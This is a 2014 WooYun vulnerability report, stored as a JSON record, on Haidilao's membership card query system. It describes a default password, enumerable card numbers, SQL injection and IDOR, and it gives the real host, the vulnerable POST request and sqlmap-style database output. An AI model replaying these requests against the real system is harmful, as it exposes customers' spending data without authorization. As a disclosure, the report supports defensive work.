{"id": 51789, "wybug_id": "wooyun-2014-073341", "wybug_title": "海底捞欢乐卡查询系统漏洞打包（可遍历用户、SQL注入、越权访问）", "wybug_corp": "haidilao.com", "wybug_author": "老抽王", "wybug_date": "2014-08-21 18:13", "wybug_open_date": "2014-08-26 18:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 同事买了张海底捞欢乐，我近前一观发现存在多个漏洞。当时就发现几个问题1.弱密码可按卡号推算批量查询用户使用金额（默认密码123456）2.登录后有注入（可查询数据库内容）3.平行越权改cardsId 看他们消费情况 详细说明：  同事买了张海底捞欢乐，我近前一观发现存在多个漏洞。不知道什么原因插补了图当时就发现几个问题1.弱密码可按卡号推算批量查询用户使用金额（默认密码123456）首页http://118.186.245.5:9084/TzxMember/member.jsp上有写默认密码，卡号CZ00000223739（朋友的卡号）顺延或前推前后各测了3个号码，都可以登录2.登录后有注入（可查询数据库内容）貌似注入很多随便找了个查询，抓了下POST包POST /TzxMember/myExpendAction!findCardDetails.action HTTP/1.1Host: 118.186.245.5:9084COOKIES:自己抓一下cardsId=1392387&bbrqS=&bbrqE=&page=1&rows=10&sort=id&order=asc3.平行越权改cardsId 看他们消费情况还是上面的包，改一下ID看其他人的消费情况。   漏洞证明：  同事买了张海底捞欢乐，我近前一观发现存在多个漏洞。上传图片一直报错，图片就剩了哦~~~当时就发现几个问题1.弱密码可按卡号推算批量查询用户使用金额（默认密码123456）首页http://118.186.245.5:9084/TzxMember/member.jsp上有写默认密码，卡号CZ00000223739（朋友的卡号）顺延或前推2.登录后有注入（可查询数据库内容）貌似注入很多随便找了个查询，抓了下POST包。POST /TzxMember/myExpendAction!findCardDetails.action HTTP/1.1Host: 118.186.245.5:9084cardsId=1392387&bbrqS=&bbrqE=&page=1&rows=10&sort=id&order=asc可以读库，可以操作，跑的权限（跑几下证明一下就行了）如下。 [INFO] fetching privileges for user 'DB2INST1' [INFO] retrieved: SYSTOOLS.HMON_ATM_INFO,YGGGGGGG [INFO] retrieved: SYSTOOLS.HMON_COLLECTION,YGGGGGGG [INFO] retrieved: SYSTOOLS.POLICY可以读数据库（跑几行就停了，证明有就行）： [INFO] retrieved: 19 [INFO] retrieved: NULLID [INFO] retrieved: SQLJ [INFO] retrieved: SYSCAT [INFO] retrieved: SYSFUN [INFO] retrieved: SYSIBM [INFO] retrieved: SYSIBMADM3.平行越权改cardsId 看他们消费情况还是上面的包，改一下ID看其他人的消费情况。这个就不截图了cardsId=1392387&bbrqS=&bbrqE=&page=1&rows=10&sort=id&order=asc 改改CARDSid就行。   修复方案：  技术上：各种过滤吧   版权声明：转载请注明来源 老抽王@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-26 18:14 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}